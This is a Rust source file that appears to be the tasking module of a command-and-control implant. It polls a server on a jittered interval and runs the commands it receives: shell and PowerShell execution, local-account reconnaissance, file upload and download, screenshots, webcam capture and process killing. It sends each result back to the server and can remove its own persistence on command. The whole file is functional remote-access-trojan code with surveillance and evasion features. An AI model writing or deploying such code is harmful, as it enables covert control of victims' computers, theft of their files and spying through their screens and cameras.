use libra_comm::http::HttpCommunicator;
use libra_load::ModuleMainFn;

use super::utils::blocking_string;
use super::utils::blocking_val;

// ── Heartbeat ────────────────────────────────────────────────────────────

/// What a heartbeat task needs: either a module entry to execute (lock-free)
/// or an already-computed response.
enum TaskOutcome {
    /// Execute this module entry with the given input (no locks held).
    Run { main: ModuleMainFn, input: String },
    /// Response used verbatim (matches legacy direct-return branches).
    DoneUnwrapped(String),
    /// Response that gets wrapped in the standard task envelope.
    DoneWrapped(String),
}

pub(crate) async fn heartbeat_tick(
    http: &HttpCommunicator,
    agent_id: &str,
    session_key: Option<&[u8; 32]>,
    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
) -> Result<(), String> {
    let task = http.heartbeat(agent_id, session_key).await?;
    if let Some(ref task) = task {
        eprintln!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
            task.id,
            task.command_type,
            task.command,
            task.timeout_seconds
        );

        // Resolve the module entry under the lock, then execute it *without*
        // the lock so a long-running task never blocks the heartbeat (or other
        // tasks) — the same concurrency model as the WS dispatcher.
        let outcome = {
            let mut mm = module_manager.lock().await;
            resolve_task(task, &mut mm).await
        };

        let result = match outcome {
            TaskOutcome::Run { main, input } => {
                let output = match crate::module_manager::execute_module(main, &input).await {
                    Ok(r) => r,
                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
                };
                wrap_result(&task.id, &output)
            }
            TaskOutcome::DoneUnwrapped(r) => r,
            TaskOutcome::DoneWrapped(r) => wrap_result(&task.id, &r),
        };

        eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
        let _ = http.submit_result(agent_id, &result, session_key).await;
    }
    Ok(())
}

fn wrap_result(task_id: &str, output: &str) -> String {
    let success = !output.contains("\"error\"");
    serde_json::json!({
        "taskId": task_id,
        "success": success,
        "output": output,
        "error": null,
    }).to_string()
}

/// Map a heartbeat task to a module entry (or a direct response). Called while
/// the module manager lock is held; execution happens after the lock drops.
async fn resolve_task(
    task: &libra_common::models::AgentTask,
    module_manager: &mut crate::module_manager::ModuleManager,
) -> TaskOutcome {
    use libra_common::models::CommandType;

    let run = |name: String, input: serde_json::Value| async move {
        match module_manager.prepare(&name, &input.to_string()).await {
            Ok((main, input)) => TaskOutcome::Run { main, input },
            Err(e) => TaskOutcome::DoneWrapped(
                serde_json::json!({ "success": false, "output": e }).to_string(),
            ),
        }
    };

    match task.command_type {
        CommandType::Shell => {
            let input = serde_json::json!({
                "command": task.command,
                "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
            });
            run("shell".to_string(), input).await
        }
        CommandType::PowerShell => {
            let input = serde_json::json!({ "script": task.command.clone() });
            run("powershell".to_string(), input).await
        }
        CommandType::LocalAccounts => {
            run("recon".to_string(), serde_json::json!({ "op": "local_accounts" })).await
        }
        CommandType::Proxy => {
            run("proxy".to_string(), serde_json::json!({ "url": task.command, "method": "GET" })).await
        }
        CommandType::FileList => {
            let input = serde_json::json!({ "op": "list", "path": task.command, "limit": 1000 });
            run("files".to_string(), input).await
        }
        CommandType::FileDrives => {
            let drives = blocking_val(|| {
                let executor = libra_platform::get_executor();
                executor.get_drives()
            }).await;
            let escaped: Vec<String> = drives.iter()
                .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                .collect();
            let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
            TaskOutcome::DoneUnwrapped(json)
        }
        CommandType::Upload | CommandType::Download => {
            // File transfer with arguments: FileOps read/write (cloud module)
            if let Some(arg) = task.arguments.first() {
                let cmd = task.command.clone();
                let arg = arg.clone();
                let is_download = task.command_type == CommandType::Download;
                let (op, data) = if is_download {
                    ("write", arg)
                } else {
                    ("read", String::new())
                };
                let input = serde_json::json!({ "op": op, "path": cmd, "data": data });
                run("files".to_string(), input).await
            } else {
                TaskOutcome::DoneWrapped(r#"{"error":"No file path specified"}"#.to_string())
            }
        }
        CommandType::Screenshot => {
            let r = blocking_string(move || libra_modules::execution::ScreenCapture::capture("medium", None)).await;
            TaskOutcome::DoneWrapped(r)
        }
        CommandType::Webcam => {
            let r = blocking_string(move || libra_modules::execution::CameraCapture::capture(0)).await;
            TaskOutcome::DoneWrapped(r)
        }
        CommandType::Kill => {
            // Kill specific process by PID (cloud recon module)
            if let Ok(pid) = task.command.parse::<u32>() {
                run("recon".to_string(), serde_json::json!({ "op": "kill", "pid": pid })).await
            } else {
                TaskOutcome::DoneWrapped(r#"{"error":"Invalid PID"}"#.to_string())
            }
        }
        CommandType::Sleep => {
            TaskOutcome::DoneWrapped(r#"{"status":"sleeping"}"#.to_string())
        }
        CommandType::KillAndClean => {
            eprintln!("[kill_and_clean] removing persistence and exiting");
            crate::persistence::PersistenceManager::cleanup();
            std::process::exit(0);
        }
        _ => {
            // Unknown command type — respond with generic ok
            TaskOutcome::DoneWrapped(format!(r#"{{"status":"ok","commandType":"{:?}"}}"#, task.command_type))
        }
    }
}

pub(crate) fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let jitter = (base_ms as f64 * jitter_percent * (rng.gen::<f64>() * 2.0 - 1.0)) as i64;
    (base_ms as i64 + jitter).max(500) as u64
}